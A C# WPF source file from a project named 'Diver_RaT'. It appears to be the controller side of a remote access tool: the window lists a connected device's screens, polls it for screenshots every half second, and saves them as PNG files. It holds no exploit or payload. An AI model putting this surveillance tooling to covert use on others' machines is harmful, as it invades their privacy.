using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text.Json;
using System.Windows;
using System.Windows.Threading;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class ScreenCaptureWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly DispatcherTimer _previewTimer;
        private bool _capturing;
        private int _consecutiveErrors;

        public ScreenCaptureWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Screen Capture - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";

            _previewTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(500) };
            _previewTimer.Tick += (_, _) => _ = RefreshFrame();

            _ = LoadScreens();
        }

        private async System.Threading.Tasks.Task LoadScreens()
        {
            StatusText.Text = "Detecting screens...";
            var result = await _server.SendCommandAsync(_device.Id, "LIST_SCREENS", timeoutMs: 15000);
            if (!result.Success)
            {
                StatusText.Text = $"Could not detect screens: {result.Error}";
                return;
            }

            ScreenCombo.IsEnabled = true;
            var items = new List<ScreenItem>();
            try
            {
                using var doc = JsonDocument.Parse(result.Result ?? "[]");
                foreach (var e in doc.RootElement.EnumerateArray())
                {
                    items.Add(new ScreenItem
                    {
                        Index = e.GetProperty("index").GetInt32(),
                        Name = e.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "",
                        Width = e.TryGetProperty("width", out var w) ? w.GetInt32() : 0,
                        Height = e.TryGetProperty("height", out var h) ? h.GetInt32() : 0,
                        Primary = e.TryGetProperty("primary", out var p) && p.GetBoolean()
                    });
                }
            }
            catch (Exception ex)
            {
                StatusText.Text = $"Invalid screen list: {ex.Message}";
                return;
            }

            ScreenCombo.ItemsSource = items;
            ScreenCombo.SelectedIndex = items.FindIndex(s => s.Primary);
            StatusText.Text = $"Detected {items.Count} screen(s).";
            StartPreview();
        }

        private void StartPreview()
        {
            _consecutiveErrors = 0;
            _previewTimer.Start();
            _ = RefreshFrame();
            CaptureButton.Content = "\U0001f4f7  Stop Capture";
            StatusText.Text = "Live preview running";
        }

        private void StopPreview()
        {
            _previewTimer.Stop();
            CaptureButton.Content = "\U0001f4f7  Capture Now";
            StatusText.Text = "Preview stopped";
        }

        private void CaptureButton_Click(object sender, RoutedEventArgs e)
        {
            if (_previewTimer.IsEnabled) StopPreview();
            else StartPreview();
        }

        private async System.Threading.Tasks.Task RefreshFrame()
        {
            if (_capturing) return;
            _capturing = true;
            try
            {
                Dictionary<string, string>? args = null;
                if (ScreenCombo.SelectedItem is ScreenItem sel)
                    args = new Dictionary<string, string> { ["screen"] = sel.Index.ToString() };

                var result = await _server.SendCommandAsync(_device.Id, "SCREENSHOT", args, timeoutMs: 15000);
                if (result.Success && !string.IsNullOrEmpty(result.Result))
                {
                    var res = result.Result;
                    if (res.StartsWith("/9j/") || res.StartsWith("iVBOR") || res.StartsWith("Qk"))
                    {
                        ScreenImage.Source = ImageHelper.FromBase64(res);
                        SaveButton.IsEnabled = true;
                        Placeholder.Visibility = Visibility.Collapsed;
                        _consecutiveErrors = 0;
                        StatusText.Text = _previewTimer.IsEnabled
                            ? $"Live preview (every {_previewTimer.Interval.TotalSeconds:0.#}s). Last: {DateTime.Now:HH:mm:ss}"
                            : $"Captured {DateTime.Now:HH:mm:ss}";
                    }
                    else if (res.Contains("waiting", StringComparison.OrdinalIgnoreCase) ||
                             res.Contains("no frame", StringComparison.OrdinalIgnoreCase))
                    {
                        _consecutiveErrors = 0;
                        StatusText.Text = "Waiting for screen share approval on the device...";
                    }
                    else
                    {
                        HandleFailure($"Capture failed: {res}");
                    }
                }
                else
                {
                    var err = result.Error ?? "";
                    if (err.Contains("waiting", StringComparison.OrdinalIgnoreCase) ||
                        err.Contains("permission", StringComparison.OrdinalIgnoreCase) ||
                        err.Contains("no frame", StringComparison.OrdinalIgnoreCase))
                    {
                        _consecutiveErrors = 0;
                        StatusText.Text = "Waiting for screen share approval on the device...";
                    }
                    else
                    {
                        HandleFailure($"Capture failed: {err}");
                    }
                }
            }
            catch (Exception ex)
            {
                HandleFailure($"Capture failed: {ex.Message}");
            }
            finally
            {
                _capturing = false;
            }
        }

        private void HandleFailure(string message)
        {
            _consecutiveErrors++;
            StatusText.Text = message;
            if (_consecutiveErrors >= 3 && _previewTimer.IsEnabled)
            {
                StopPreview();
                StatusText.Text = $"Preview stopped after repeated failures: {message}";
            }
        }

        private async void ScreenCombo_SelectionChanged(object sender, System.Windows.Controls.SelectionChangedEventArgs e)
        {
            if (_previewTimer.IsEnabled)
                await RefreshFrame();
        }

        private void Window_Closing(object? sender, CancelEventArgs e) => _previewTimer.Stop();

        private void SaveButton_Click(object sender, RoutedEventArgs e)
        {
            if (ScreenImage.Source is not System.Windows.Media.Imaging.BitmapSource bmp) return;
            var dlg = new SaveFileDialog
            {
                FileName = $"screen_{_device.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}.png",
                Filter = "PNG image|*.png"
            };
            if (dlg.ShowDialog(this) != true) return;

            var encoder = new System.Windows.Media.Imaging.PngBitmapEncoder();
            encoder.Frames.Add(System.Windows.Media.Imaging.BitmapFrame.Create(bmp));
            using var fs = System.IO.File.Create(dlg.FileName);
            encoder.Save(fs);
            StatusText.Text = $"Saved to {dlg.FileName}";
        }
    }

    public class ScreenItem
    {
        public int Index { get; set; }
        public string Name { get; set; } = "";
        public int Width { get; set; }
        public int Height { get; set; }
        public bool Primary { get; set; }
        public override string ToString() =>
            $"{Index + 1}. {Width}x{Height}{(Primary ? " (primary)" : "")} {Name}";
    }
}